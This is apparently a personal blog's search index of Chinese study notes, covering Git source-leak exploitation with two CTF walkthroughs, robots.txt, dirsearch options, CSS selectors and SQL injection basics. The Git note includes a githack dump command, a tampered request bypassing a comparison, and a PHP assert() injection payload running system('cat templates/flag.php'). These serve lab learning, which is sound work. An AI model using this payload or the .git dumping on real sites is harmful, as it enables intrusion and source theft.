<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>git源码泄露问题</title>
      <link href="/git%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/"/>
      <url>/git%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/</url>
      
        <content type="html"><![CDATA[<h1 id="git源码泄露问题"><a href="#git源码泄露问题" class="headerlink" title="git源码泄露问题"></a>git源码泄露问题</h1><h2 id="githack是什么"><a href="#githack是什么" class="headerlink" title="githack是什么"></a>githack是什么</h2><ol><li>GitHack是一个.git泄露利用测试脚本，通过泄露的文件，还原重建工程源代码。</li></ol><h2 id="Git-源码泄露"><a href="#Git-源码泄露" class="headerlink" title="Git 源码泄露"></a>Git 源码泄露</h2><p>开发人员会使用 git 进行版本控制，对站点自动部署。但如果配置不当，可能会将 .git 文件夹直接部署到线上环境，这就引起了 git 泄露漏洞，我们可以利用这个漏洞直接获得网页源码。</p><h2 id="确定是否存在泄漏"><a href="#确定是否存在泄漏" class="headerlink" title="确定是否存在泄漏"></a>确定是否存在泄漏</h2><p>想要确定是否存在这个漏洞，可以通过以下方式。首先是看看有没有提示醒目地指出 Git，如果有就考虑存在。如果没有也可以使用 dirsearch 工具扫描后台，如果存在则会扫描出 .git 目录如图所示。</p><h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h2><ol><li>githack只能在python2环境下运行，否则会出现<br><img src="https://s2.loli.net/2022/05/17/ufNapbJdWSlRhHE.png"></li></ol><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="攻防世界lottery"><a href="#攻防世界lottery" class="headerlink" title="攻防世界lottery"></a>攻防世界lottery</h3><ol><li><p>打开网页，让我们买彩票赚钱，随便买一下<br><img src="https://img2020.cnblogs.com/blog/1774310/202009/1774310-20200902101030311-594723942.png"><br><img src="https://img2020.cnblogs.com/blog/1774310/202009/1774310-20200902102734433-334503714.png"></p></li><li><p>赚够足够的钱，才能够买flag<br><img src="https://img2020.cnblogs.com/blog/1774310/202009/1774310-20200902103927411-413792927.png"></p></li><li><p>用dirsearch扫一下后台,发现有git<br><img src="https://s2.loli.net/2022/05/17/uKqnltzHT9wRcUJ.png"></p></li><li><p>或者用御剑扫以下后台，发现robot协议文件，发现禁用git，很可疑，判断是git源码泄露</p></li><li><p>用githack扫描url，把文件都下载下来</p><pre class="line-numbers language-none"><code class="language-none">python githack.py URL<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>打开其中的 “api.php” 文件审计代码，注意到这里有个 buy() 函数，这个是我们在网页买彩票会调用的函数。其中我们看到 numbers 这个变量是我们能操作的，函数会以数组的形式提取每位数字。</p></li></ol><p><img src="https://s2.loli.net/2022/05/17/G8wMKyUBuP3Abgp.png"></p><ol start="7"><li><p>由于随机变量是数字，因此我们可以使用 true 来满足比较，但是我们显然不能在输入框输入 7 个 “true”。因此我们考虑修改数据包，通过抓包发现数据的传输是通过传一个映射来上传的。<br><img src="https://img2020.cnblogs.com/blog/1774310/202009/1774310-20200902103450123-831589597.jpg"></p></li><li><p>因此抓包之后修改 numbers 变量为一个数组，其中的 7 个变量都是 true。放包之后就能够快速赚钱了，赚够钱后购买得到 flag</p></li></ol><pre class="line-numbers language-none"><code class="language-none">&#123;&quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:[true,true,true,true,true,true,true]&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="攻防世界mfw"><a href="#攻防世界mfw" class="headerlink" title="攻防世界mfw"></a>攻防世界mfw</h2><ol><li>打开后在每个标签中查看<br><img src="https://s2.loli.net/2022/05/18/hG7ucDX1SlxnLR8.png"></li><li>查看源代码发现有个跳转到flag的超链接被注释掉了，但是不允许修改，我直接改跳转到contact的超链接为flag<br><img src="https://s2.loli.net/2022/05/18/rFoVfdMxc4JqHDz.png"></li><li>但是在flag标签内什么也没有发现<br><img src="https://s2.loli.net/2022/05/18/yCV58D71mQvMdYt.png"></li><li>在上一张图片中有两个词，git和php，猜测是git源码泄露，用dirsearch跑一跑,真的发现了很多.git文件</li></ol><p><img src="https://s2.loli.net/2022/05/18/GVN56mYsDi31W4S.png"></p><ol start="5"><li><p>用githack去跑，看看能不能下下来一些.git下的源码，发现在.index的开头找到了php源码<br><img src="https://s2.loli.net/2022/05/18/9mv3rVzMhtELTjU.png"></p></li><li><p>其中assert()函数会将括号中的字符当成代码来执行，并返回true或false，strpos()函数会返回字符串第一次出现的位置，如果没有找到则返回False</p></li><li><p>于是重心就放在file变量中，发现file变量是用我们输入的page变量拼接而成的，而且没有任何的过滤，我们可以在这段输入的字符中插入system函数来执行系统命令<br><img src="https://s2.loli.net/2022/05/18/kfJjFVSPbWrpsHc.png"></p></li><li><p>注意到调用file时用的单引号和括号来限制file的范围<br>于是可以构造url为</p><pre class="line-numbers language-none"><code class="language-none">page&#x3D;a &#39;) or system(&quot;cat templates&#x2F;flag.php&quot;);&#x2F;&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/05/18/jG4twcHOWvbkFCq.png"></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> ing </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ing </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>robots协议</title>
      <link href="/robot%E5%8D%8F%E8%AE%AE%E6%96%87%E4%BB%B6/"/>
      <url>/robot%E5%8D%8F%E8%AE%AE%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="robots协议"><a href="#robots协议" class="headerlink" title="robots协议"></a>robots协议</h1><h2 id="存放位置"><a href="#存放位置" class="headerlink" title="存放位置"></a>存放位置</h2><ol><li>robots.txt是存放在站点根目录下的一个纯文本文件。</li></ol><h2 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h2><ol><li>Robots协议（也称为爬虫协议、机器人协议等）的全称是“网络爬虫排除标准”（Robots Exclusion Protocol），网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。</li></ol><h2 id="作用的描述："><a href="#作用的描述：" class="headerlink" title="作用的描述："></a>作用的描述：</h2><ol><li>Robots协议也称为爬虫协议、爬虫规则、机器人协议，是网站国际互联网界通行的道德规范,其目的是保护网站数据和敏感信息、确保用户个人信息和隐私不被侵犯。“规则”中将搜索引擎抓取网站内容的范围做了约定,包括网站是否希望被搜索引擎抓取,哪些内容不允许被抓取,而网络爬虫可以据此自动抓取或者不抓取该网页内容。</li><li>如果将网站视为酒店里的一个房间,robots.txt就是主人在房间门口悬挂的“请勿打扰”或“欢迎打扫”的提示牌。这个文件告诉来访的搜索引擎哪些房间可以进入和参观,哪些不对搜索引擎开放。</li></ol><h2 id="书写规范"><a href="#书写规范" class="headerlink" title="书写规范"></a>书写规范</h2><ol><li><p>robots.txt（统一小写）是一种存放于网站根目录下的ASCII编码的文本文件，它通常告诉网络搜索引擎的漫游器（又称网络蜘蛛），此网站中的哪些内容是不应被搜索引擎的漫游器获取的，哪些是可以被漫游器获取的。因为一些系统中的URL是大小写敏感的，所以robots.txt的文件名应统一为小写。robots.txt应放置于网站的根目录下。如果想单独定义搜索引擎的漫游器访问子目录时的行为，那么可以将自定的设置合并到根目录下的robots.txt，或者使用robots元数据（Metadata，又稱元資料）。</p></li><li><p>robots.txt协议并不是一个规范，而只是约定俗成的，所以并不能保证网站的隐私。注意robots.txt是用字符串比较来确定是否获取URL，所以目录末尾有与没有斜杠“/”表示的是不同的URL。robots.txt允许使用类似”Disallow: *.gif”这样的通配符[1][2]。</p></li><li><p>其他的影响搜索引擎的行为的方法包括使用robots元数据：</p><pre class="line-numbers language-none"><code class="language-none">&lt;meta name&#x3D;&#39;robot&#39; content&#x3D;&quot;noindex,nofollow&quot; &#x2F;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h1 id="robot协议详解"><a href="#robot协议详解" class="headerlink" title="robot协议详解"></a>robot协议详解</h1><ol><li>Robots协议是Web站点和搜索引擎爬虫交互的一种方式，Robots.txt是存放在站点根目录下的一个纯文本文件。该文件可以指定搜索引擎爬虫只抓取指定的内容，或者是禁止搜索引擎爬虫抓取网站的部分或全部内容。当一个搜索引擎爬虫访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索引擎爬虫就会按照该文件中的内容来确定访问的范围；如果该文件不存在，那么搜索引擎爬虫就沿着链接抓取。</li></ol><h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><pre class="line-numbers language-none"><code class="language-none">允许所有的机器人：User-agent: *Disallow:另一写法User-agent: *Allow:&#x2F;仅允许特定的机器人：（name_spider用真实名字代替）User-agent: name_spiderAllow:拦截所有的机器人：User-agent: *Disallow: &#x2F;禁止所有机器人访问特定目录：User-agent: *Disallow: &#x2F;cgi-bin&#x2F;Disallow: &#x2F;images&#x2F;Disallow: &#x2F;tmp&#x2F;Disallow: &#x2F;private&#x2F;仅禁止坏爬虫访问特定目录（BadBot用真实的名字代替）：User-agent: BadBotDisallow: &#x2F;private&#x2F;禁止所有机器人访问特定文件类型[2]：User-agent: *Disallow: &#x2F;*.php$Disallow: &#x2F;*.js$Disallow: &#x2F;*.inc$Disallow: &#x2F;*.css$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dirsearch使用方法</title>
      <link href="/dirsearch/"/>
      <url>/dirsearch/</url>
      
        <content type="html"><![CDATA[<h1 id="dirsearch使用方法"><a href="#dirsearch使用方法" class="headerlink" title="dirsearch使用方法"></a>dirsearch使用方法</h1><h2 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h2><ol><li><p>dirsearch 是一款使用 python3 编写的，用于暴力破解目录的工具，其 README 有写到下面一点</p></li><li><p>Heuristically detects invalid web pages（启发式地检测无效 web 页面）</p></li></ol><h2 id="命令："><a href="#命令：" class="headerlink" title="命令："></a>命令：</h2><pre class="line-numbers language-none"><code class="language-none">最基本：python dirsearch.py -u URL后面选项:  -h, --help            显示此帮助消息并退出  Mandatory:    -u URL, --url&#x3D;URL   URL目标        -L URLLIST, --url-list&#x3D;URLLIST                        URL列表目标                            -e EXTENSIONS, --extensions&#x3D;EXTENSIONS                        以逗号分隔的扩展列表（示例：php、asp）                            -E, --extensions-list                        使用公共扩展的预定义列表  Dictionary Settings:    -w WORDLIST, --wordlist&#x3D;WORDLIST                        自定义单词表（用逗号分隔）    -l, --lowercase    -f, --force-extensions                        强制扩展每个单词表条目（如DirBuster）  常规设置:    -s DELAY, --delay&#x3D;DELAY                        请求之间的延迟（浮点数）                            -r, --recursive     递归暴力        -R RECURSIVE_LEVEL_MAX, --recursive-level-max&#x3D;RECURSIVE_LEVEL_MAX                        最大递归级别（子目录）（默认值：1[仅限根目录+1目录]）                            --suppress-empty, --suppress-empty    --scan-subdir&#x3D;SCANSUBDIRS, --scan-subdirs&#x3D;SCANSUBDIRS                        扫描给定-u |--url的子目录（分开逗号）                            --exclude-subdir&#x3D;EXCLUDESUBDIRS, --exclude-subdirs&#x3D;EXCLUDESUBDIRS                        在递归过程中排除下列子目录扫描（用逗号分隔）                            -t THREADSCOUNT, --threads&#x3D;THREADSCOUNT                        线程数                            -x EXCLUDESTATUSCODES, --exclude-status&#x3D;EXCLUDESTATUSCODES                        排除状态代码，用逗号分隔（例如：301，500个）                            --exclude-texts&#x3D;EXCLUDETEXTS                        用逗号分隔的文本排除响应(示例: &quot;Not found&quot;, &quot;Error&quot;)                            --exclude-regexps&#x3D;EXCLUDEREGEXPS                        按regexp排除响应，用逗号分隔(示例： &quot;Not foun[a-z]&#123;1&#125;&quot;, &quot;^Error$&quot;)                            -c COOKIE, --cookie&#x3D;COOKIE        --ua&#x3D;USERAGENT, --user-agent&#x3D;USERAGENT    用户代理       -F, --follow-redirects     --遵循重定向        -H HEADERS, --header&#x3D;HEADERS 页眉，--页眉&#x3D;页眉                        要添加的标题 (example: --header &quot;Referer:                        example.com&quot; --header &quot;User-Agent: IE&quot;                            --random-agents, --random-user-agents     随机代理，--随机用户代理  连接设置:    --timeout&#x3D;TIMEOUT   连接超时        --ip&#x3D;IP             将名称解析为IP地址        --proxy&#x3D;HTTPPROXY, --http-proxy&#x3D;HTTPPROXY                        Http代理 (example: localhost:8080                            --http-method&#x3D;HTTPMETHOD                        要使用的方法，默认值：GET，也可能是：HEAD；POST                            --max-retries&#x3D;MAXRETRIES    最大重试次数        -b, --request-by-hostname                        默认情况下，dirsearch将通过IP请求速度。这将强制按主机名请求 报告:    --simple-report&#x3D;SIMPLEOUTPUTFILE 简单输出文件                        只找到路径                            --plain-text-report&#x3D;PLAINTEXTOUTPUTFILE 纯文本输出文件                        找到带有状态代码的路径                            --json-report&#x3D;JSONOUTPUTFILE JSON输出文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/05/17/uKqnltzHT9wRcUJ.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> ing </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ing </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS</title>
      <link href="/CSS/"/>
      <url>/CSS/</url>
      
        <content type="html"><![CDATA[<h1 id="网页分为"><a href="#网页分为" class="headerlink" title="网页分为"></a>网页分为</h1><ol><li>结构:HTML</li><li>表现:CSS</li><li>行为:JS</li></ol><h1 id="CSS-层叠样式表"><a href="#CSS-层叠样式表" class="headerlink" title="CSS 层叠样式表"></a>CSS 层叠样式表</h1><ol><li>层叠：网页是一个立体的结构，只是看起来像是一个平面，其实有一定的层次结构</li><li>我们看到的只是最上面的一层</li><li>通过CSS可以为网页的每一个层设置样式</li><li>总之：CSS可以用来设置网页中元素的样式</li></ol><h1 id="使用CSS来修改元素的样式"><a href="#使用CSS来修改元素的样式" class="headerlink" title="使用CSS来修改元素的样式"></a>使用CSS来修改元素的样式</h1><h2 id="第一种方式：内联样式（不推荐使用）"><a href="#第一种方式：内联样式（不推荐使用）" class="headerlink" title="第一种方式：内联样式（不推荐使用）"></a>第一种方式：内联样式（不推荐使用）</h2><ol><li>在标签内部通过style属性来设置元素的样式</li><li>只能在开始标签中设置,style的值即为css</li><li>名字和值之间使用冒号连接</li><li>每一个名值对以分号结尾<pre class="line-numbers language-none"><code class="language-none">&lt;p style&#x3D;&quot;color:red; font-size:20px&quot;&gt;&lt;&#x2F;p&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="不推荐使用内联样式"><a href="#不推荐使用内联样式" class="headerlink" title="不推荐使用内联样式"></a>不推荐使用内联样式</h3></li><li>使用内联样式，只能对一个标签生效</li><li>如果希望影响到多个元素，必须在每一个元素中都复制一遍</li><li>后期维护的时候，如果前期复制一百遍，后期就要改一百遍，维护起来非常不方便</li></ol><h4 id="CSS选择器"><a href="#CSS选择器" class="headerlink" title="CSS选择器"></a>CSS选择器</h4><pre class="line-numbers language-none"><code class="language-none">p&#123;color:green;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>标签名+{属性}</li></ol><h3 id="开发时一定一定不要使用内联样式"><a href="#开发时一定一定不要使用内联样式" class="headerlink" title="开发时一定一定不要使用内联样式"></a>开发时一定一定不要使用内联样式</h3><h2 id="第二种方式：内部样式表"><a href="#第二种方式：内部样式表" class="headerlink" title="第二种方式：内部样式表"></a>第二种方式：内部样式表</h2><ol><li>将样式编写到head中的style标签中</li><li>然后通过CSS的选择器来选中元素，并为其设置各种样式</li><li>可以同时为多个标签设置样式，并且修改时只需要修改一处即可全部应用</li><li>内部样式表更方便对样式进行重复使用</li><li>内部样式表只能对一个页面起作用，里面的样式不能跨页面进行复用</li></ol><h2 id="第三种方式：外部样式表（最佳使用方式）"><a href="#第三种方式：外部样式表（最佳使用方式）" class="headerlink" title="第三种方式：外部样式表（最佳使用方式）"></a>第三种方式：外部样式表（最佳使用方式）</h2><h3 id="可以将CSS样式编写到一个外部的CSS文件中"><a href="#可以将CSS样式编写到一个外部的CSS文件中" class="headerlink" title="可以将CSS样式编写到一个外部的CSS文件中"></a>可以将CSS样式编写到一个外部的CSS文件中</h3><h3 id="然后通过link标签引入外部的CSS文件"><a href="#然后通过link标签引入外部的CSS文件" class="headerlink" title="然后通过link标签引入外部的CSS文件"></a>然后通过link标签引入外部的CSS文件</h3><pre class="line-numbers language-none"><code class="language-none">p&#123;    color: tomato;    font-size: 100px;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="lt-link-gt"><a href="#lt-link-gt" class="headerlink" title="&lt; link&gt;"></a>&lt; link&gt;</h3><ol><li>通过link标签来引入外部的CSS文件</li><li>外部样式表需要通过link标签进行引入，意味着只要想使用这些样式的网页可以对其进行引用</li></ol><h3 id="作用："><a href="#作用：" class="headerlink" title="作用："></a>作用：</h3><ol><li>使样式可以在不同页面进行复用，提高复用率</li><li>将样式编写到外部的CSS文件中，可以使用浏览器的缓存机制，从而加快网页的加载速度，提高用户的体验</li></ol><h1 id="CSS语法"><a href="#CSS语法" class="headerlink" title="CSS语法"></a>CSS语法</h1><h2 id="和HTML不同"><a href="#和HTML不同" class="headerlink" title="和HTML不同"></a>和HTML不同</h2><ol><li>CSS语法和HTML的语法互相隔离</li></ol><h2 id="注释："><a href="#注释：" class="headerlink" title="注释："></a>注释：</h2><ol><li>和c++中的多行注释相同<pre class="line-numbers language-none"><code class="language-none">&#x2F;*abc*&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><pre class="line-numbers language-none"><code class="language-none">p&#123;    color: red;    font-size: 20px;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="选择器"><a href="#选择器" class="headerlink" title="选择器"></a>选择器</h3><ol><li>通过选择器可以选中页面中的指定元素</li><li>选择器选中的是html中的标签</li></ol><h3 id="声明块"><a href="#声明块" class="headerlink" title="声明块"></a>声明块</h3><ol><li>通过声明块来指定要为元素设置的样式</li><li>声明块由一个个的声明组成</li><li>声明是由一个个的名值对组成</li></ol><h4 id="名值对"><a href="#名值对" class="headerlink" title="名值对"></a>名值对</h4><ol><li>一个样式名对应一个样式值，名和值之间以’:’连接，以’;’结尾</li><li>样式名值对之间的分号不能省略，最后一个名值对后面的分号可以省略（我联想到了sql语句select选中列的语法相同）</li></ol><h1 id="选择器-1"><a href="#选择器-1" class="headerlink" title="选择器"></a>选择器</h1><h2 id="元素选择器"><a href="#元素选择器" class="headerlink" title="元素选择器"></a>元素选择器</h2><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><ol><li>根据标签来选中指定的元素<h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2></li><li>标签名{}<pre class="line-numbers language-none"><code class="language-none">p&#123;&#125; h1&#123;&#125; div&#123;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="https://s2.loli.net/2022/05/15/qQw72DNRAcvPsYL.png"></li></ol><h2 id="id选择器"><a href="#id选择器" class="headerlink" title="id选择器"></a>id选择器</h2><h3 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h3><ol><li>根据元素的id属性值选中一个元素</li></ol><h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><pre class="line-numbers language-none"><code class="language-none">#id属性值&#123;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/05/15/wxAhokB8HdZtTiN.png"></p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><ol><li>id值只有一个，不能重复使用</li></ol><p><img src="https://s2.loli.net/2022/05/15/qQWEGuYVzd4nm7s.png"></p><h2 id="class选择器（类）"><a href="#class选择器（类）" class="headerlink" title="class选择器（类）"></a>class选择器（类）</h2><ol><li>class是一个标签的属性，和id类似，不同的是，class可以重复使用</li><li>可以通过class属性来为元素分组</li><li>可以同时为一个元素指定多个class属性</li><li>标签中的多个class属性通过空格隔开&amp;/nbsp;<br><img src="https://s2.loli.net/2022/05/16/NHKhdM9qXUuWJwF.png"></li></ol><h3 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h3><pre class="line-numbers language-none"><code class="language-none">.class(属性值)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/05/16/gjH1zo382Q7uGFy.png"></p><h2 id="通配选择器"><a href="#通配选择器" class="headerlink" title="通配选择器"></a>通配选择器</h2><h3 id="作用-2"><a href="#作用-2" class="headerlink" title="作用"></a>作用</h3><ol><li>选中页面中的所有元素<h3 id="语法-3"><a href="#语法-3" class="headerlink" title="语法"></a>语法</h3><pre class="line-numbers language-none"><code class="language-none">*&#123;属性值&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="https://s2.loli.net/2022/05/15/5j74LVzBTZpN9He.png"></li></ol><h1 id="复合选择器"><a href="#复合选择器" class="headerlink" title="复合选择器"></a>复合选择器</h1><h2 id="交叉选择器"><a href="#交叉选择器" class="headerlink" title="交叉选择器"></a>交叉选择器</h2><ol><li>选中同时满足多个条件的元素</li><li>多个选择器的复合<h3 id="语法-4"><a href="#语法-4" class="headerlink" title="语法"></a>语法</h3></li><li>选择器1.选择器2.选择器n{}<pre class="line-numbers language-none"><code class="language-none">div.red&#123;    font-size: 30px;    color: red;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h3><ol><li>交叉选择器中如果有元素选择器，必须使用元素选择器开头</li><li>一般不会出现id选择器和其它选择器的复用，因为id选择器已经可以唯一确定一个标签，一般只是元素选择器和类选择器之间的交叉</li></ol><h2 id="选择器分组-并集选择器"><a href="#选择器分组-并集选择器" class="headerlink" title="选择器分组/并集选择器"></a>选择器分组/并集选择器</h2><h3 id="作用-3"><a href="#作用-3" class="headerlink" title="作用"></a>作用</h3><ol><li>同时选择多个选择器对应的元素</li></ol><h3 id="语法-5"><a href="#语法-5" class="headerlink" title="语法"></a>语法</h3><pre class="line-numbers language-none"><code class="language-none">选择器1,选择器2,选择器n&#123;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>逗号在此处相当于是并集符号<br><img src="https://s2.loli.net/2022/05/16/tF5kXKfyqu1zaoM.png"></li></ol><h2 id="交叉选择器和并集选择器可以复合使用"><a href="#交叉选择器和并集选择器可以复合使用" class="headerlink" title="交叉选择器和并集选择器可以复合使用"></a>交叉选择器和并集选择器可以复合使用</h2><h2 id="网页中不同元素之间的关系"><a href="#网页中不同元素之间的关系" class="headerlink" title="网页中不同元素之间的关系"></a>网页中不同元素之间的关系</h2><h3 id="父子关系"><a href="#父子关系" class="headerlink" title="父子关系"></a>父子关系</h3><ol><li>直接包含子元素的是父元素（注意是直接）</li><li>直接被父元素包含的是子元素<h3 id="祖先后代元素"><a href="#祖先后代元素" class="headerlink" title="祖先后代元素"></a>祖先后代元素</h3></li><li>直接或间接包含后代元素叫祖先元素</li><li>一个元素的父元素也是祖先元素</li><li>直接或间接被祖先元素包含的元素叫做后代元素</li></ol><h3 id="兄弟元素"><a href="#兄弟元素" class="headerlink" title="兄弟元素"></a>兄弟元素</h3><ol><li>拥有相同父元素的叫兄弟元素</li></ol><h2 id="关系选择器"><a href="#关系选择器" class="headerlink" title="关系选择器"></a>关系选择器</h2><h3 id="子元素选择器"><a href="#子元素选择器" class="headerlink" title="子元素选择器"></a>子元素选择器</h3><h4 id="作用：-1"><a href="#作用：-1" class="headerlink" title="作用："></a>作用：</h4><ol><li>选中指定父元素的指定子元素<h4 id="语法-6"><a href="#语法-6" class="headerlink" title="语法"></a>语法</h4><pre class="line-numbers language-none"><code class="language-none">父元素 &gt; 子元素div &gt; span &#123;    color: red;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="后代元素选择器"><a href="#后代元素选择器" class="headerlink" title="后代元素选择器"></a>后代元素选择器</h3><h4 id="作用：-2"><a href="#作用：-2" class="headerlink" title="作用："></a>作用：</h4><ol><li>选中指定元素的指定后代元素</li><li>范围比子选择器更大，相当于递归处理（-r）</li></ol><h4 id="语法-7"><a href="#语法-7" class="headerlink" title="语法"></a>语法</h4><pre class="line-numbers language-none"><code class="language-none">祖先 后代&#123;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="兄弟元素选择器"><a href="#兄弟元素选择器" class="headerlink" title="兄弟元素选择器"></a>兄弟元素选择器</h2><h3 id="作用-4"><a href="#作用-4" class="headerlink" title="作用"></a>作用</h3><ol><li>选择下一个兄弟</li><li>注意必须是紧邻的下一个兄弟元素</li><li>隔开的兄弟元素不会被选中</li><li>前面的兄弟元素不会被选中，只会选中前面的兄弟元素</li></ol><h3 id="语法-8"><a href="#语法-8" class="headerlink" title="语法"></a>语法</h3><pre class="line-numbers language-none"><code class="language-none">前一个 + 下一个 p + span&#123; &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">选择下边所有的兄弟兄 ~ 弟&#123;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="属性选择器"><a href="#属性选择器" class="headerlink" title="属性选择器"></a>属性选择器</h2><h3 id="title可以指定标签的标题"><a href="#title可以指定标签的标题" class="headerlink" title="title可以指定标签的标题"></a>title可以指定标签的标题</h3><ol><li>写的是什么，鼠标光标移到某个位置，可以显示提示文字</li></ol><h3 id="语法-9"><a href="#语法-9" class="headerlink" title="语法"></a>语法</h3><pre class="line-numbers language-none"><code class="language-none">元素选择器[属性]&#123;    属性&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/05/16/f4yUhwZo2QePTOi.png"><br><img src="https://s2.loli.net/2022/05/16/ZeJnYEp79XFv1qD.png"><br><img src="https://s2.loli.net/2022/05/16/DrRizNOxHB8jMqW.png"></p><h3 id="作用-5"><a href="#作用-5" class="headerlink" title="作用"></a>作用</h3><ol><li>选择含有指定属性的元素</li></ol><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><pre class="line-numbers language-none"><code class="language-none">[属性名] 选择含有指定属性的元素[属性名&#x3D;属性值] 选择含有指定元素属性和属性值的元素[属性名^&#x3D;属性值] 选择属性值以指定值开头的元素[属性名$&#x3D;属性值] 选择属性值以指定值结尾的元素[属性名*&#x3D;属性值] 选择属性值中含有某值的元素<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CSS </category>
          
          <category> ing </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
            <tag> ing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小迪sql更新ing</title>
      <link href="/%E5%B0%8F%E8%BF%AAsql%E6%9B%B4%E6%96%B0Ing/"/>
      <url>/%E5%B0%8F%E8%BF%AAsql%E6%9B%B4%E6%96%B0Ing/</url>
      
        <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><ol><li>$_REQUEST是一个PHP超级全局变量，用于在提交HTML表单后收集数据</li><li>其中request内部x为参数名称</li><li>$id=$request;id是变量名称<br><img src="https://s2.loli.net/2022/05/09/sgActeK3pFujEQB.png"></li><li>?id=是get传参，参数传递给id</li><li>mysql_query($sql)来执行sql语句</li><li>mysql_fetch_array($result)来展示结果</li><li><img src="https://s2.loli.net/2022/05/09/ECWUtYsDQBVLHvq.png"></li><li>通过参数传递，拼接到之前定义的sql语句中，来实现自定义查询<br><img src="https://s2.loli.net/2022/05/10/A7tpuDqGrkaINRs.png"></li></ol><h1 id="常用unicode编码"><a href="#常用unicode编码" class="headerlink" title="常用unicode编码"></a>常用unicode编码</h1><ol><li>%20是空格’ ‘</li><li>%23是注释#</li></ol>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
